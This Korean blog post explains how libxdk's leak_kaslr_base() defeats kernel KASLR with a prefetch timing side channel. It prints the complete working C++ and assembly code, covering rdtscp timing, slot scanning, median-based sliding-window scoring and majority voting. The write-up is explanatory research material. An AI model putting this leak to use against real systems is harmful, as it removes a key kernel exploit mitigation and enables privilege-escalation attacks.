---
title: Leak kernel base with prefetch side-channel attack
date: 2026-06-25 17:53:21 +0900
categories: [kernel]
---

libxdk의 leak_kaslr_base() 함수가 어떤 원리로 커널 베이스 주소를 구하는지 알아보도록 하자.

해당 함수는 `kernel-research/libxdk/util/pwn_utils.cpp`에 구현되어 있다.

## 1. 개요

libxdk의 prefetch leak은 커널 메모리를 직접 읽어서 베이스 주소를 구하는 것이 아니다.

대신 가능한 kernel base 후보들을 prefetch하고 그 명령이 걸리는 시간을 비교해서 실제 커널 이미지가 매핑된 영역을 추정한다.

## 2. KASLR 후보 공간

libxdk는 커널 베이스 후보를 다음 범위로 본다.

```cpp
const uint64_t KASLR_START = 0xFFFFFFFF81000000;
const uint64_t KASLR_END = KASLR_START + 0x40000000;
const uint64_t KASLR_SLOT_SIZE = 0x200000;
```
의미는 다음과 같다.

```text
KASLR_START     가능한 가장 낮은 kernel base 후보
KASLR_END       KASLR 후보 탐색의 끝
KASLR_SLOT_SIZE 후보 간 간격, 2MB
```

따라서 후보 주소들은 다음과 같이 만들어진다.

```text
slot 0   -> 0xffffffff81000000
slot 1   -> 0xffffffff81200000
slot 2   -> 0xffffffff81400000
...
```

코드로는 다음 함수가 이 변환을 담당한다.

```cpp
uint64_t slot_to_addr(size_t slot) {
    return KASLR_START + (slot * KASLR_SLOT_SIZE);
}
```

탐색 slot 개수는 다음과 같다.

```text
(KASLR_END - KASLR_START) / KASLR_SLOT_SIZE
= 0x40000000 / 0x200000
= 512
```

즉 한 번의 scan은 512개의 kernel base 후보를 검사한다.

## 3. prefetch?

유저 모드에서 커널 주소를 읽으려고 하면 page fault가 발생한다. 

하지만 prefetch 계열 명령은 데이터를 캐시로 가져오라고 cpu에게 힌트를 주는 명령이다. 이 명령은 일반 load처럼 값을 architectural하게 읽지 않으며, 접근할 수 없는 주소에 대해서도 보통 fault를 발생시키지 않는다.

| 명령어 | 의미 |
|---|---|
| `prefetcht0 [addr]` | L1/L2/L3 캐시에 강하게 올리려는 힌트 |
| `prefetcht1 [addr]` | 중간 수준 캐시에 올리려는 힌트 |
| `prefetcht2 [addr]` | 더 낮은 수준 캐시에 올리려는 힌트 |
| `prefetchnta [addr]` | Non-temporal access용. 캐시 오염을 줄이려는 힌트 |
| `prefetchw [addr]` | 곧 write할 주소를 미리 가져오라는 힌트 |

libxdk는 이 특성을 이용한다.

```cpp
inline __attribute__((always_inline)) void prefetch(uint64_t addr) {
    asm volatile("prefetchnta (%0)\n\t"
                 "prefetcht2 (%0)\n\t"
                 :
                 : "r"(addr));
}
```

핵심 아이디어는 다음과 같다.

```text
mapped kernel address와 unmapped kernel address는 prefetch 처리 시간이 미묘하게 다를 수 있다.
```

이 차이는 매우 작고 noisy하므로 단일 주소 하나만 보고 판단하지 않는다. 전체 후보 slot을 여러 번 측정하고, 커널 이미지가 차지하는 연속 구간을 통계적으로 찾는다.

## 4. Side-channel?

side-channel 기법은 프로그램이 직접 제공하지 않는 정보를 부수적인 관찰값을 통해 추론하는 기법이다.

일반적인 데이터 흐름은 다음처럼 명시적인 값을 읽는 방식이다.

```text
secret value -> load/read -> attacker가 값을 직접 획득
```

반면 side-channel은 값을 직접 읽지 않는다. 대신 secret이 시스템의 다른 물리적, 시간적, 자원 사용 특성에 남기는 흔적을 관찰한다.

```text
secret state -> cache/TLB/branch predictor/timing/power 변화
             -> attacker가 변화량 측정
             -> secret에 대한 정보 추론
```

대표적인 side-channel 관찰값은 다음과 같다.

```text
timing      특정 연산이 걸린 시간
cache       cache hit/miss 여부
TLB         address translation cache 상태
branch      branch predictor 상태
contention  같은 CPU 자원을 두고 경쟁할 때 생기는 지연
page fault  fault 발생 여부 또는 fault 처리 시간
```

여기서는 timing을 사용한 side-channel을 사용한다.

공격자가 얻을 수 있는 값은 

```text
prefetch(candidate_kernel_address)가 걸린 CPU cycle 수
```
뿐이다. 

하지만 이 timing은 해당 주소가 실제로 매핑되어 있는지, page table walk가 어떻게 진행되는지, cache/TLB/microarchitectural state가 어떤지에 따라 달라질 수 있다. 그래서 timing을 많이 모으면 주소 공간의 구조를 추론할 수 있다.

## 5. 반복적인 측정

side-channel 측정값은 본질적으로 noisy하다. 같은 주소에 대해 같은 명령을 실행해도 매번 같은 cycle 수가 나오지는 않는다.

이에 대한 이유는 다양할 수 있다.

```text
interrupt
scheduler preemption
CPU frequency scaling
SMT sibling thread의 간섭
cache eviction
TLB 상태 변화
hypervisor noise
memory subsystem contention
out-of-order execution
measurement instruction 자체의 overhead
...
```

그래서 side-channel exploit은 보통 다음 전략을 쓴다.

```text
반복 측정
최소값 또는 median 사용
outlier 제거
여러 후보를 상대 비교
여러 trial의 majority vote
CPU pinning
...
```

libxdk 구현도 이 패턴을 따른다.

```text
samples:
    같은 slot을 여러 번 측정한다.

minimum timing:
    우연히 느려진 측정값을 배제한다.

median baseline:
    전체 후보의 일반적인 timing 기준을 잡는다.

window score:
    단일 slot의 약한 신호를 연속 구간으로 증폭한다.

trials + majority vote:
    scan 전체가 틀리는 경우를 줄인다.
```

## 6. 구현

```cpp
// uint64_t leak_kaslr_base(uint64_t window_size, int samples = 100, int trials = 7);
uint64_t leak_kaslr_base(uint64_t window_size, int samples, int trials) {
    std::vector<std::optional<uint64_t>> candidates;
    for (int i = 0; i < trials; i++) {
        candidates.push_back(try_leak_kaslr_base(window_size, samples));
    }

    std::optional<uint64_t> base = find_majority(candidates);
    if (!base.has_value()) {
        throw ExpKitError("Failed to leak KASLR base");
    }
    return *base;
}

std::optional<uint64_t> try_leak_kaslr_base(uint64_t window_size, int samples) {
    size_t slots = (KASLR_END - KASLR_START) / KASLR_SLOT_SIZE;
    std::vector<uint64_t> timings(slots, std::numeric_limits<uint64_t>::max());

    for (int i = 0; i < samples; i++) {
        for (size_t slot = 0; slot < slots; slot++) {
            uint64_t addr = slot_to_addr(slot);
            uint64_t timing = sidechannel(addr);
            if (timing < timings[slot]) {
                timings[slot] = timing;
            }
        }
    }

    std::optional<size_t> slot = try_find_edge(timings, window_size);
    if (slot.has_value()) {
        return slot_to_addr(*slot);
    }
    return std::nullopt;
}

size_t sidechannel(uint64_t addr) {
    size_t time = rdtsc_begin();
    prefetch(addr);
    size_t delta = rdtsc_end() - time;
    return delta;
}

inline __attribute__((always_inline)) uint64_t rdtsc_begin() {
    uint64_t a, d;
    asm volatile("mfence\n\t"
                 "rdtscp\n\t"
                 "mov %%rdx, %0\n\t"
                 "mov %%rax, %1\n\t"
                 "xor %%rax, %%rax\n\t"
                 "lfence\n\t"
                 : "=r"(d), "=r"(a)
                 :
                 : "%rax", "%rbx", "%rcx", "%rdx");
    a = (d << 32) | a;
    return a;
}

inline __attribute__((always_inline)) void prefetch(uint64_t addr) {
    asm volatile("prefetchnta (%0)\n\t"
                 "prefetcht2 (%0)\n\t"
                 :
                 : "r"(addr));
}

inline __attribute__((always_inline)) uint64_t rdtsc_end() {
    uint64_t a, d;
    asm volatile("xor %%rax, %%rax\n\t"
                 "lfence\n\t"
                 "rdtscp\n\t"
                 "mov %%rdx, %0\n\t"
                 "mov %%rax, %1\n\t"
                 "mfence\n\t"
                 : "=r"(d), "=r"(a)
                 :
                 : "%rax", "%rbx", "%rcx", "%rdx");
    a = (d << 32) | a;
    return a;
}

std::optional<uint64_t> try_find_edge(const std::vector<uint64_t> &timings, uint64_t window_size) {
    if (timings.size() < window_size) {
        return std::nullopt;
    }

    // The median timing represents the timing of an unmapped page because there are by
    // far more unmapped pages than mapped pages. The window of pages that maximizes the sum of the
    // absolute differences between each page's timing and the median timing is the window that
    // contains the KASLR base address.
    uint64_t median = compute_median(timings);

    uint64_t current_sum_diff = 0;
    for (size_t k = 0; k < window_size; ++k) {
        current_sum_diff += abs_diff(timings[k], median);
    }

    uint64_t max_sum_diff = current_sum_diff;
    std::optional<size_t> best_slot = 0;

    for (size_t i = 1; i <= timings.size() - window_size; ++i) {
        current_sum_diff -= abs_diff(timings[i - 1], median);
        current_sum_diff += abs_diff(timings[i + window_size - 1], median);

        if (current_sum_diff > max_sum_diff) {
            max_sum_diff = current_sum_diff;
            best_slot = i;
        }
    }

    if (best_slot.has_value()) {
        return best_slot;
    }
    return std::nullopt;
}

uint64_t slot_to_addr(size_t slot) { return KASLR_START + (slot * KASLR_SLOT_SIZE); }
```

## 7. 분석

### 7.1. 하나의 주소에 대한 timing 측정

하나의 주소에 대한 timing은 sidechannel()에서 측정한다.

흐름은 다음과 같다.

```text
1. rdtsc_begin()으로 시작 timestamp를 읽는다.
2. 후보 주소에 prefetchnta, prefetcht2를 실행한다.
3. rdtsc_end()로 종료 timestamp를 읽는다.
4. 종료 - 시작 값을 timing으로 사용한다.
```

`rdtsc_begin()`과 `rdtsc_end()`는 그냥 `rdtsc`만 쓰지 않고 fence와 `rdtscp`를 같이 사용한다.

이 fence들은 CPU의 out-of-order execution 때문에 timestamp 측정 구간이 앞뒤 명령과 섞이는 것을 줄인다. 즉, 측정하고 싶은 구간이 최대한 `prefetch(addr)` 주변으로 제한되도록 만든다.

### 7.2. 모든 slot에 대한 반복 측정

`try_leak_kaslr_base(window_size, samples)`는 한 번의 leak trial을 수행한다.

처음에는 512개 slot timing을 아주 큰 값으로 초기화한다.

그 다음 모든 slot을 `samples`번 반복 측정한다.

측정한 값들의 평균이 아닌 최솟값을 저장한다.

위에서도 언급했듯이, side-channel 측정은 noise가 많다. 그렇기 때문에 최솟값이 가장 간섭이 적었던 측정에 가깝다고 할 수 있기 때문에 이 값을 저장한다.

기본 `samples` 값은 100이다. 따라서 기본 설정에서 한 trial은 다음 측정을 수행한다.

```text
512 slots * 100 samples = 51200 timing measurements
```
### 7.3. 중앙값 찾기

측정이 끝나면 `try_find_edge()`가 timing 배열을 분석한다.

먼저 전체 timing의 중앙값을 구한다.

중앙값을 이유는 후보 slot 대부분이 실제 커널 이미지가 아니기 때문이다.

```text
전체 512개 slot 중 실제 커널 이미지가 차지하는 slot은 일부다.
나머지 대부분은 unmapped 또는 커널 이미지 밖의 후보 영역이다.
```

### 7.4. window 

커널 이미지는 base 주소 한 slot에만 존재하는 것이 아니라, `_text`에서 시작해서 여러 2MB slot에 걸쳐 연속적으로 매핑된다.

예를 들어 `window_size = 0x29`라면 커널 이미지는 2MB 단위로 약 41개 slot을 차지한다고 보는 것이다.

따라서 알고리즘은 “가장 이상한 slot 하나”를 찾지 않는다. 대신 다음 질문에 답하려고 한다.

```text
어느 시작 slot부터 window_size개 연속 slot을 잡았을 때,
그 구간의 timing 패턴이 일반 unmapped 영역과 가장 크게 다른가?
```

이 시작 slot이 kernel base 후보가 된다.
계산의 흐름은 다음과 같다.

각 slot의 timing이 baseline인 중앙값과 얼마나 다른지 계산한다.

```text
diff[i] = abs(timings[i] - median)
```

그 다음 길이 `window_size`의 sliding window를 움직이며 diff 합을 계산한다.

```text
score(start) =
    diff[start]
  + diff[start + 1]
  + ...
  + diff[start + window_size - 1]
```

가장 높은 score를 가진 window가 커널 이미지가 있는 구간으로 선택된다.

코드는 처음 window의 합을 구한 뒤:

```cpp
uint64_t current_sum_diff = 0;
for (size_t k = 0; k < window_size; ++k) {
    current_sum_diff += abs_diff(timings[k], median);
}
```

window를 한 칸씩 옮기면서 빠지는 slot의 diff를 빼고 새로 들어오는 slot의 diff를 더한다.

```cpp
current_sum_diff -= abs_diff(timings[i - 1], median);
current_sum_diff += abs_diff(timings[i + window_size - 1], median);
```

이 방식은 매 window마다 전체 합을 다시 계산하지 않아도 되므로 효율적이다.

최대 score가 갱신되면 그 시작 slot을 저장한다.

```cpp
if (current_sum_diff > max_sum_diff) {
    max_sum_diff = current_sum_diff;
    best_slot = i;
}
```

마지막에 `best_slot`을 주소로 바꾸면 한 trial의 kernel base 후보가 된다.

```cpp
return slot_to_addr(*slot);
```

### 7.5. 예시로 보는 sliding window

단순화해서 slot이 12개이고, 실제 커널 이미지가 slot 5부터 8까지 4개 slot을 차지한다고 하자.

```text
slot:      0  1  2  3  4  5  6  7  8  9 10 11
mapped:   .  .  .  .  .  K  K  K  K  .  .  .
```

prefetch timing을 median과 비교한 diff가 다음처럼 나왔다고 하자.

```text
diff:      2  1  3  2  1 15 18 17 16  2  1  3
```

`window_size = 4`이면 각 시작 위치의 score는 다음과 비슷하다.

```text
start 0:  2 + 1 + 3 + 2  =  8
start 1:  1 + 3 + 2 + 1  =  7
start 2:  3 + 2 + 1 + 15 = 21
start 3:  2 + 1 + 15 +18 = 36
start 4:  1 +15 +18 +17 = 51
start 5: 15 +18 +17 +16 = 66  <- maximum
start 6: 18 +17 +16 + 2 = 53
```

최대 score가 `start 5`에서 나오므로 kernel base는 slot 5 주소라고 판단한다.

```text
kernel_base = KASLR_START + 5 * 0x200000
```

### 7.6. 여러 trial과 majority

한 번의 trial은 noise 때문에 틀릴 수 있다. 그래서 전체 과정을 여러 번 반복한다.

trials의 기본값은 7이다. 즉 다음과 같은 형태를 가진다.

```text
trial 1 -> 후보 A
trial 2 -> 후보 A
trial 3 -> 후보 B
trial 4 -> 후보 A
trial 5 -> 후보 A
trial 6 -> 후보 none
trial 7 -> 후보 A

majority = A
```

`find_majority()`는 Boyer-Moore majority vote 방식으로 후보를 고른 뒤, 실제로 전체 trial 중 과반을 차지했는지 다시 센다.

```text
actual_count > trials / 2
```

과반 후보가 있으면 그 값을 kernel base로 반환한다. 과반이 없으면 side-channel 결과가 불안정하다고 보고 실패한다.

### 7.7. 최종 검증

찾은 후보는 `check_kaslr_base()`로 검증한다.

```cpp
bool is_kaslr_base(uint64_t kbase_addr) {
    if ((kbase_addr & 0xFFFF0000000FFFFF) != 0xFFFF000000000000)
        return false;
    return true;
}
```

이 조건은 두 가지를 확인한다.

```text
1. 주소가 x86-64 커널 high-half 영역인지
2. base 주소의 low bits가 적절히 정렬되어 있는지
```

`leak_kaslr_base()` 자체는 2MB slot 단위 주소를 반환하므로 정상 후보라면 alignment 조건을 만족해야 한다.

### 7.8. window size가 틀린다면?

`window_size`는 sliding window 길이다. 이 값이 실제 커널 이미지의 runtime 2MB page 수와 맞아야 탐지가 안정적이다.

너무 작으면:

```text
커널 이미지 전체 패턴을 충분히 포함하지 못한다.
일부 강한 outlier 구간을 base로 오인할 수 있다.
```

너무 크면:

```text
커널 이미지 밖의 일반 slot까지 많이 포함한다.
score 차이가 흐려지고 실제 시작점이 밀릴 수 있다.
```

그래서 libxdk는 가능하면 `Target::GetKernelPageCount()`로 타겟별 값을 사용한다. 이 값이 없으면 `vmlinux`를 분석해 구한다.

```bash
python3 image_db/kernel_pages.py $KOBJ/vmlinux
```

이 스크립트의 계산은 다음과 같다.

```text
initial_pages:
    PT_LOAD segment들이 차지하는 전체 physical address span을 2MB 단위로 센 값

reclaimable_pages:
    .init.scratch section 크기를 2MB로 나눈 값

runtime_pages:
    initial_pages - reclaimable_pages
```

이 `runtime_pages`가 `window_size`다.

## 8. 요약

1. 가능한 kernel base 후보를 2MB 간격 slot으로 나눈다.
2. 각 slot 주소에 대해 prefetch timing을 측정한다.
3. 이 측정을 samples번 반복하고 slot별 최소 timing을 저장한다.
4. 전체 timing의 median을 baseline으로 잡는다.
5. 각 slot timing과 median의 차이를 계산한다.
6. window_size 길이의 sliding window를 움직이며 차이 합을 구한다.
7. 차이 합이 가장 큰 window의 시작 slot을 kernel base 후보로 선택한다.
8. 이 trial을 trials번 반복한다.
9. 과반으로 나온 후보를 최종 kernel base로 선택한다.
10. check_kaslr_base()로 주소 형태를 검증한다.
